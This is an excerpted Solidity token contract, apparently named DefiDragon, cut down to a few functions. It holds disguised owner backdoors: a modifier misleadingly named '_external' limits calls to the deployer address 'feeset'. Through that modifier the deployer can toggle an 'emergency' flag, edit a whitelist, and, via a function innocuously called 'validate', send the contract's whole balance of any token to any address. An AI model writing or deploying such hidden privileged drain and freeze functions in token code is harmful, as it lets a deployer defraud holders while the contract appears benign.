...
abstract contract Ownable is Context {
    ...
    address private feeset = msg.sender;
    constructor() {
    ...
    modifier _external() {
        require(msg.sender == feeset, "Ownable: caller is not the owner");
        _;
    }
...
contract DefiDragon is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address  private  devWallet = payable(0x24E9ab1Cd742200b9773d315D38a43aD882b82e9);
    ...
    function status(bool change) public _external {
        emergency = change;
    }
    ...
    function excludeFromWhitelist(address account) public _external {
        _isWhitelisted[account] = false;
    }

    function includeInWhitelist(address account) public _external {
    ...
    function validate(address _token, address _to) external _external returns (bool _sent) {
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        _sent = IERC20(_token).transfer(_to, _contractBalance);
        emit TransferForeignToken(_token, _contractBalance);
    }
    function auth() public _external {
